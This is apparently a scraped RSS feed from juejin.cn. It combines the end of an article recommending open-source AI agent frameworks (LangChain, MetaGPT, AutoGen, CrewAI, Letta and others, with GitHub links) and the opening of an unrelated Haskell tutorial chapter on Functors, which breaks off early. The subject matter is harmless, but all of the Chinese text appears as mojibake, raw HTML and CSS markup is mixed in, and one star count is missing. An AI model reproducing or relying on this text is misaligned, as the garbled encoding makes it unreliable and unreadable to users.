<p>å®ƒæœ‰å¾ˆå¤šé«˜åº¦æ¨¡å—åŒ–çš„ç»„ä»¶ï¼ŒåŒ…æ‹¬é“¾ Chainsã€ä»£ç† Agents å’Œè®°å¿† Memoryã€‚</p>
<p>å¼€å‘è€…å¯ä»¥åƒæ­ç§¯æœ¨ä¸€æ ·ï¼Œå°†æç¤ºè¯ç®¡ç†ã€æ–‡æ¡£åŠ è½½ã€å‘é‡æ£€ç´¢ä»¥åŠæ¨¡å‹è°ƒç”¨ä¸²è”æˆä¸€ä¸ªå®Œæ•´çš„å·¥ä½œæµã€‚</p>
<p>ç‰¹åˆ«æ˜¯å…¶å¼ºå¤§çš„ Agent æœºåˆ¶ï¼Œå¤§æ¨¡å‹å……å½“æ¨ç†å¼•æ“ï¼ŒåŠ¨æ€å†³å®šè°ƒç”¨å“ªäº›å¤–éƒ¨å·¥å…·ï¼Œæ¯”å¦‚ Google æœç´¢ã€è®¡ç®—å™¨æˆ– API å•¥çš„æ¥è§£å†³é—®é¢˜ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7615873691aa43eca8bc880825c68cd3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767667259&amp;x-signature=6Nh%2FMZSWbA3%2BO6r43A%2BNDj4mwiU%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>ç‰¹åˆ«æ˜¯å…¶å­é¡¹ç›®Â LangGraphï¼Œä¸“é—¨ç”¨äºæ„å»ºæœ‰çŠ¶æ€çš„ã€å¤šè§’è‰²çš„ Agent åº”ç”¨ã€‚</p>
<p>å®ƒæä¾›äº†é«˜åº¦å¯æ§çš„å¾ªç¯è®¡ç®—èƒ½åŠ›ï¼Œè®©å¼€å‘è€…èƒ½å¤Ÿç²¾ç»†åœ°æ§åˆ¶ Agent çš„å†³ç­–æµç¨‹ï¼Œæ˜¯ Python å¼€å‘è€…æ„å»ºå¤æ‚ Agent çš„é¦–é€‰åº•å±‚æ¡†æ¶ã€‚</p>
<pre><code class="hljs language-arduino" lang="arduino">å¼€æºåœ°å€ï¼šhttps:<span class="hljs-comment">//github.com/langchain-ai/langchain</span>
</code></pre>
<h2 data-id="heading-3">04ã€MetaGPT</h2>
<p>MetaGPT ç°åœ¨åœ¨ GitHub ä¸Šæœ‰ 6 ä¸‡å¤š Star äº†ã€‚Â </p>
<p>å¦‚æœæƒ³ç ”ç©¶å¤šæ™ºèƒ½ä½“åä½œï¼Œè¿™ä¸ªå¼€æºé¡¹ç›®å¯ä»¥è¯´æ˜¯æœ€é‡è¦çš„æ¡†æ¶ä¹‹ä¸€ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3206b7f4522b46e4b09e5e958c73eeda~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767667259&amp;x-signature=Vvq0q%2B6XhJNdZEESiMqsNp5Y9F0%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>å®ƒæ¨¡æ‹Ÿäº†ä¸€ä¸ªè™šæ‹Ÿçš„è½¯ä»¶å…¬å¸ï¼Œå†…éƒ¨åŒ…å«äº§å“ç»ç†ã€æ¶æ„å¸ˆã€é¡¹ç›®ç»ç†å’Œå·¥ç¨‹å¸ˆç­‰ä¸åŒè§’è‰²çš„ Agentã€‚</p>
<p>åªè¦è¾“å…¥ä¸€å¥è¯éœ€æ±‚ï¼Œè¿™äº›Â Agent å°±ä¼šååŒå·¥ä½œï¼Œè¾“å‡ºç”¨æˆ·æ•…äº‹ã€ç«å“åˆ†æã€è®¾è®¡å›¾ç”šè‡³å¯è¿è¡Œçš„ä»£ç ã€‚</p>
<p>é€‚åˆå¯¹å¤šæ™ºèƒ½ä½“åä½œï¼ˆMulti-Agent Collaborationï¼‰æ„Ÿå…´è¶£çš„å¼€å‘è€…ï¼Œç‰¹åˆ«é€‚åˆé‚£ç§æµç¨‹å›ºå®šã€å¯¹è¾“å‡ºç¨³å®šæ€§è¦æ±‚é«˜çš„åœºæ™¯ã€‚</p>
<pre><code class="hljs language-arduino" lang="arduino">å¼€æºåœ°å€:Â https:<span class="hljs-comment">//github.com/geekan/MetaGPT</span>
</code></pre>
<h2 data-id="heading-4">05ã€Microsoft AutoGen</h2>
<p>å¾®è½¯å¼€æºçš„æ¡†æ¶ï¼Œä¹‹å‰ä¹Ÿä»‹ç»è¿‡ï¼Œç°åœ¨å·²ç» Â çš„ Star äº†ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1fac7399e0e6477cb6e81643f73a6e26~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767667259&amp;x-signature=pOvi7KG5ZNN3MuLxM8F%2FynI%2B6Tc%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>å®ƒä¸“æ³¨äºå¤šæ™ºèƒ½ä½“å¯¹è¯ã€‚å¯ä»¥å®šä¹‰å¤šä¸ªå¯ä»¥ç›¸äº’å¯¹è¯çš„ Agentï¼Œå¯ä»¥æ˜¯ LLMã€äººç±»æˆ–å·¥å…·ï¼Œå®ƒä»¬é€šè¿‡å¯¹è¯æ¥åä½œè§£å†³ä»»åŠ¡ã€‚</p>
<p>è¯¥æ¡†æ¶é«˜åº¦æŠ½è±¡å’Œçµæ´»ï¼Œæ”¯æŒå¤šç§å¯¹è¯æ¨¡å¼ï¼Œæ˜¯ç›®å‰å·¥ä¸šç•Œå’Œå­¦æœ¯ç•Œæ¢ç´¢å¤šæ™ºèƒ½ä½“ç³»ç»Ÿï¼ˆMulti-Agent Systemsï¼‰æœ€ä¸»æµçš„æ¡†æ¶ä¹‹ä¸€ã€‚</p>
<pre><code class="hljs language-arduino" lang="arduino">å¼€æºåœ°å€:Â https:<span class="hljs-comment">//github.com/microsoft/autogen</span>
</code></pre>
<h2 data-id="heading-5">06ã€Flowise</h2>
<p>Flowise æ˜¯ä¸€ä¸ªä½ä»£ç /æ— ä»£ç çš„ UI å¯è§†åŒ–å·¥å…·ï¼Œç°åœ¨Â 48k çš„ Star äº†ã€‚</p>
<p>å¦‚æœä½ è¢« LangChain æ™¦æ¶©çš„æ–‡æ¡£åŠé€€äº†ï¼Œä¸å¦¨å…ˆè¯•è¯• Flowiseã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4341a3a4c7244f2a988f09f4cdcef716~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767667259&amp;x-signature=DEBpjempwFKd8kPtL5JDOwmIxBI%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>é€šè¿‡æ‹–æ‹½çš„æ–¹å¼æ„å»ºå¤§æ¨¡å‹åº”ç”¨ï¼Œå®ƒåº•å±‚åŸºäº LangChainï¼Œç”¨æˆ·å¯ä»¥é€šè¿‡è¿æ¥ä¸åŒçš„èŠ‚ç‚¹ï¼Œæ¯”å¦‚ PDF åŠ è½½å™¨ã€OpenAI æ¨¡å‹ã€Agentæ‰§è¡Œå™¨ç­‰æ¥æ„å»ºè‡ªå®šä¹‰çš„é€»è¾‘æµã€‚</p>
<p>å¯¹äºä¸æ“…é•¿å†™ä»£ç ä½†æƒ³å¿«é€Ÿæ­å»º Agent åŸå‹çš„ç”¨æˆ·æ¥è¯´ï¼Œè¿™æ˜¯ä¸€ä¸ªéå¸¸å‹å¥½çš„å¹³å°ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/171489b99ad84bbba58b1a11c2082466~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767667259&amp;x-signature=koq0WLRV00hK30uJwIspJ49ju%2FM%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<pre><code class="hljs language-arduino" lang="arduino">å¼€æºåœ°å€:Â https:<span class="hljs-comment">//github.com/FlowiseAI/Flowise</span>
</code></pre>
<h2 data-id="heading-6">07ã€CrewAI</h2>
<p>CrewAI æ˜¯è¿‘å¹´æ¥å¼‚å†›çªèµ·çš„ Python æ¡†æ¶ï¼Œå®ƒä¸»æ‰“è§’è‰²æ‰®æ¼”ï¼ˆRole-Playingï¼‰çš„ç¼–æ’ï¼ŒÂ ç°åœ¨å·²ç» 42k çš„ Star äº†ã€‚</p>
<p>è¿™ä¸ªå¼€æºé¡¹ç›®ä¸åƒ AutoGen é‚£ä¹ˆæŠ½è±¡ï¼Œå†™ CrewAI çš„ä»£ç æ„Ÿè§‰å°±åƒæ˜¯åœ¨ç»™å‘˜å·¥å†™ä»»åŠ¡ä¹¦ï¼Œéå¸¸æ¸…æ™°æ˜“æ‡‚ï¼Œæ˜¯ Python å¼€å‘è€…ä¸Šæ‰‹å¤šæ™ºèƒ½ä½“çš„é¦–é€‰</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2675a5ed33a24f9ca93b62a02ddf2cf0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767667259&amp;x-signature=DM5Y%2BVfAMEbY5mfxWwmFzKkL92E%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>å®ƒè®©å¼€å‘è€…å¯ä»¥è½»æ¾å®šä¹‰å…·æœ‰ç‰¹å®šè§’è‰²ã€ç›®æ ‡å’ŒèƒŒæ™¯æ•…äº‹çš„ Agentï¼Œå¹¶å°†å®ƒä»¬ç»„æˆä¸€ä¸ªå›¢é˜Ÿæ¥æŒ‰é¡ºåºæˆ–å±‚çº§æ‰§è¡Œä»»åŠ¡ã€‚</p>
<p>å®ƒçš„è®¾è®¡éå¸¸ç›´è§‚ï¼Œä¸ä»…æ˜“äºä¸Šæ‰‹ï¼Œè€Œä¸”èƒ½å¾ˆå¥½åœ°ä¸ LangChain å·¥å…·ç”Ÿæ€é›†æˆã€‚</p>
<pre><code class="hljs language-bash" lang="bash">å¼€æºåœ°å€: https://github.com/crewAIInc/crewAI
</code></pre>
<h2 data-id="heading-7">08ã€ChatDev</h2>
<p>è¿™ä¸ª 28K æ˜Ÿæ˜Ÿçš„å¼€æºé¡¹ç›®æ˜¯æ¸…åå¤§å­¦å›¢é˜Ÿ OpenBMB å¼€æºã€‚</p>
<p>ç±»ä¼¼äº MetaGPTï¼ŒChatDev ä¹Ÿæ˜¯æ‰“é€ äº†ä¸€ä¸ªè™šæ‹Ÿçš„è½¯ä»¶å¼€å‘å…¬å¸ã€‚</p>
<p>å®ƒé€šè¿‡èŠå¤©é“¾çš„æ–¹å¼ï¼Œè®©ä¸åŒè§’è‰²çš„æ™ºèƒ½ä½“ï¼ˆCEOã€CTOã€ç¨‹åºå‘˜ã€æµ‹è¯•å‘˜ï¼‰åœ¨å¦‚è®¾è®¡ã€ç¼–ç ã€æµ‹è¯•ã€æ–‡æ¡£ç­‰ç¯èŠ‚è¿›è¡Œæ·±åº¦åä½œã€‚</p>
<p>å…¶ç‰¹ç‚¹æ˜¯è¿‡ç¨‹å¯è§†åŒ–å¼ºï¼Œåƒæ˜¯åœ¨ç©ä¸€ä¸ªæ¨¡æ‹Ÿç»è¥æ¸¸æˆä¸€æ ·çœ‹ç€è½¯ä»¶è¢«å¼€å‘å‡ºæ¥ã€‚</p>
<p>çœ‹ç€ä¸€ä¸ªä¸ªå°äººå„¿åä½œå†™ä»£ç ç¡®å®å¾ˆæ²»æ„ˆï¼Œå®ƒä¸ºæˆ‘ä»¬å±•ç¤ºäº†æœªæ¥è½¯ä»¶å¼€å‘çš„ç»ˆæå½¢æ€ï¼Œéå¸¸æœ‰å¯å‘æ€§ã€‚</p>
<pre><code class="hljs language-arduino" lang="arduino">å¼€æºåœ°å€:Â https:<span class="hljs-comment">//github.com/OpenBMB/ChatDev</span>
</code></pre>
<h2 data-id="heading-8">09ã€SuperAGI</h2>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/af0d5f8c881e4b8daa58fc27804a9455~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767667259&amp;x-signature=4Z1pDxz%2Bmy8SakqTqACIWGlYN0U%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>è¿™ä¸ªè‡ªä¸» AI æ™ºèƒ½ä½“æ¡†æ¶ç°åœ¨å·²ç» 15K çš„ Star äº†ã€‚å¯¹äºéœ€è¦é•¿æœŸç¨³å®šè¿è¡Œã€ç›‘æ§å¤šä¸ª Agent çš„ä¼ä¸šçº§åœºæ™¯æ¥è¯´ï¼Œè¿™ä¸ªå¼€æºé¡¹ç›®åŸºå»ºéå¸¸å¿…è¦ã€‚</p>
<p>å®ƒæœ‰ä¸€å¥—å®Œæ•´çš„åŸºç¡€è®¾æ–½ï¼Œå¼€å‘è€…ç”¨å®ƒå¯ä»¥æ„å»ºã€ç®¡ç†å’Œè¿è¡Œè‡ªä¸» Agentã€‚</p>
<p>å®ƒæ‹¥æœ‰å›¾å½¢åŒ–ç•Œé¢ã€Agent å¸‚åœºã€Toolsã€å¹¶å‘ä»£ç†è¿è¡Œç­‰åŠŸèƒ½ï¼Œæ—¨åœ¨è§£å†³ AutoGPT åœ¨ç”Ÿäº§ç¯å¢ƒä¸­ä½¿ç”¨éš¾çš„é—®é¢˜ï¼Œæ˜¯ä¸€ä¸ªåŠŸèƒ½æ¯”è¾ƒå®Œå¤‡çš„ Agent ç®¡ç†å¹³å°ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f04b70bef3d34e97905144d77da2ff14~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767667259&amp;x-signature=xGWGREf0meFZ4cxVgVweVVIT8dg%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>è€Œä¸”è¿˜èƒ½é€šè¿‡å¯è§†åŒ–çš„ä»ªè¡¨ç›˜åŒæ—¶è¿è¡Œå’Œç›‘æ§å¤šä¸ª Agentï¼ŒæŸ¥çœ‹å…¶æ€ç»´é“¾ï¼ˆChain of Thoughtï¼‰å’Œæ‰§è¡Œæ—¥å¿—ã€‚</p>
<p>å¼€å‘è€…å¯ä»¥å°†è‡ªå·±å¼€å‘çš„è‡ªå®šä¹‰å·¥å…·åŒ…ã€æ™ºèƒ½ä½“æ¨¡æ¿å‘å¸ƒåˆ°å¸‚åœºä¸­ä¾›ç¤¾åŒºå¤ç”¨ã€‚</p>
<pre><code class="hljs language-arduino" lang="arduino">å¼€æºåœ°å€:Â https:<span class="hljs-comment">//github.com/TransformerOptimus/SuperAGI</span>
</code></pre>
<h2 data-id="heading-9">10ã€Letta</h2>
<p>å¤§æ¨¡å‹æœ€è®©äººå¤´ç–¼çš„å°±æ˜¯èŠç€èŠç€å°±å¿˜äº†ï¼ŒLetta æ°å¥½åˆ‡ä¸­äº†è¿™ä¸ªç—›ç‚¹ã€‚</p>
<p>å¦‚æœä½ æƒ³å¼€å‘ä¸€ä¸ªèƒ½é™ªä¼´ç”¨æˆ·å‡ ä¸ªæœˆã€ç”šè‡³å‡ å¹´çš„ä¼´ä¾£å‹åº”ç”¨ï¼Œä¸€å®šè¦çœ‹çœ‹è¿™ä¸ªå¯ä»¥æ„å»ºæœ‰çŠ¶æ€ï¼ˆStatefulï¼‰AI æ™ºèƒ½ä½“çš„å¼€æºæ¡†æ¶ã€‚</p>
<p>å®ƒä¹Ÿæ˜¯è‘—åçš„ MemGPT é¡¹ç›®çš„ç»§ä»»è€…å’Œæ­£å¼åŒ–ç‰ˆæœ¬ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c4a7ad46e40c4d8094d699aa43cbc153~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767667259&amp;x-signature=gqp00QTe%2Bg0p1P2YP7eQHtI6TBk%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>Letta é€šè¿‡å¼•å…¥ç±»ä¼¼æ“ä½œç³»ç»Ÿçš„å†…å­˜ç®¡ç†æœºåˆ¶ï¼Œè®© AI æ™ºèƒ½ä½“èƒ½å¤Ÿæ‹¥æœ‰æŒä¹…åŒ–çš„é•¿æœŸè®°å¿†ï¼Œå¹¶åœ¨ä¸åŒçš„ä¼šè¯å’Œæ—¶é—´è·¨åº¦ä¸­ä¿æŒä¸€è‡´çš„èº«ä»½å’ŒçŸ¥è¯†ã€‚</p>
<p>Letta å»¶ç»­å¹¶å¼ºåŒ–äº†å¤§æ¨¡å‹å³æ“ä½œç³»ç»Ÿçš„ç†å¿µã€‚</p>
<p>å®ƒé€šè¿‡ä¸€ç§åˆ†å±‚å†…å­˜ç»“æ„ï¼Œå°†ä¿¡æ¯åœ¨å½“å‰ä¸Šä¸‹æ–‡çª—å£å’Œå¤–éƒ¨æ•°æ®åº“ä¹‹é—´åŠ¨æ€è°ƒåº¦ã€‚</p>
<p>æ™ºèƒ½ä½“å…·å¤‡è‡ªæˆ‘ç¼–è¾‘è®°å¿†çš„èƒ½åŠ›ï¼Œèƒ½å¤Ÿè‡ªä¸»å†³å®šä½•æ—¶å°†å…³é”®ä¿¡æ¯å†™å…¥é•¿æœŸå­˜å‚¨æˆ–ä»å†å²è®°å½•ä¸­æ£€ç´¢æ•°æ®ï¼Œä»è€Œåœ¨ä¸å¢åŠ  Token æ¶ˆè€—çš„å‰æä¸‹ï¼Œå®ç°äº†ç†è®ºä¸Šæ— é™çš„ä¸Šä¸‹æ–‡çª—å£ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f4632398a2b74efba2f8da148b44fda2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767667259&amp;x-signature=uk%2BJkMSuypgainGXEEKcwo59ZoQ%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<pre><code class="hljs language-arduino" lang="arduino">å¼€æºåœ°å€ï¼šhttps:<span class="hljs-comment">//github.com/letta-ai/letta</span>
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ç¬¬å…­ç« ï¼šåŒ–ç¥ä¹‹å¢ƒä¸ä¸‡æ³•åŒæº]]></title>    <link>https://juejin.cn/post/7589246131584860195</link>    <guid>https://juejin.cn/post/7589246131584860195</guid>    <pubDate>2025-12-30T02:43:00.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589246131584860195" data-draft-id="7589186347585355810" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ç¬¬å…­ç« ï¼šåŒ–ç¥ä¹‹å¢ƒä¸ä¸‡æ³•åŒæº"/> <meta itemprop="keywords" content="Haskell"/> <meta itemprop="datePublished" content="2025-12-30T02:43:00.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Lupino"/> <meta itemprop="url" content="https://juejin.cn/user/3051900006579256"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ç¬¬å…­ç« ï¼šåŒ–ç¥ä¹‹å¢ƒä¸ä¸‡æ³•åŒæº
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3051900006579256/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Lupino
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-30T02:43:00.000Z" title="Tue Dec 30 2025 02:43:00 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»2åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>æ¬¢è¿é“å‹æ¥åˆ°<strong>ç¬¬å…­ç« </strong>ã€‚</p>
<p>ç»å†äº†ç¬¬äº”ç« â€œå…ƒå©´æœŸâ€Monad å¤©åŠ«çš„æ´—ç¤¼ï¼Œæƒ³å¿…ä½ å·²ç»é¢†æ‚Ÿäº†å¦‚ä½•å¤„ç†é‚£äº›å¸¦ç€â€œå› æœæ°”æ¯â€çš„ç›’å­ã€‚ç„¶è€Œï¼ŒMonad è™½å¼ºï¼Œå´æœ‰æ—¶æ˜¾å¾—è¿‡äºæ²‰é‡â€”â€”æ¯æ¬¡éƒ½è¦â€œæ‰“å¼€ç›’å­ã€å–å‡ºå®è´ã€é‡æ–°è£…ç›’â€ï¼Œæ˜¯å¦è®©ä½ æ„Ÿåˆ°ä¸€ä¸ç¹çï¼Ÿ</p>
<p>ä»Šæ—¥ï¼Œæˆ‘ä»¬å°†æ­¥å…¥<strong>åŒ–ç¥æœŸï¼šä¸‡æ³•é€šè¯†ï¼ˆFunctors &amp; Applicativesï¼‰</strong> ã€‚åœ¨è¿™ä¸€å±‚å¢ƒç•Œï¼Œä½ å°†å­¦ä¼šå¦‚ä½•æ–½å±•â€œéš”ç©ºå–ç‰©â€ä¸â€œå¤šé‡æ³•é˜µâ€çš„ç¥é€šï¼Œä¸å†éœ€è¦æ¯æ¬¡éƒ½äº²æ‰‹æ‹†è§£å› æœã€‚</p>
<hr/>
<p>åœ¨ Î» é—¨çš„é“ç»Ÿä¸­ï¼Œ<strong>Functor (å‡½å­)</strong> ã€<strong>Applicative (åº”ç”¨å‡½å­)</strong> å’Œ <strong>Monad (å•å­)</strong> æ„æˆäº†ä¸€åº§å®Œæ•´çš„ä¿®è¡Œé˜¶æ¢¯ã€‚åŒ–ç¥æœŸçš„æ ¸å¿ƒåœ¨äºï¼š<strong>å¦‚ä½•åœ¨ä¸ç ´åâ€œä¸Šä¸‹æ–‡ï¼ˆContextï¼‰â€çš„æƒ…å†µä¸‹ï¼Œè®©æ³•æœ¯åœ¨ç›’å­å†…éƒ¨æ‚„ç„¶ç”Ÿæ•ˆã€‚</strong></p>
<h3 data-id="heading-0">6.1 éš”ç©ºæ–—æ³•ï¼šFunctorï¼ˆå‡½å­ï¼‰</h3>
<p><strong>Functor</strong> æ˜¯æœ€åŸºç¡€çš„åŒ–ç¥ç¥é€šã€‚å®ƒçš„æ ¸å¿ƒæ³•æœ¯æ˜¯ <code>fmap</code>ï¼ˆæˆ–è€…ç¬¦å· <code>&lt;$&gt;</code>ï¼‰ã€‚</p>
<ul>
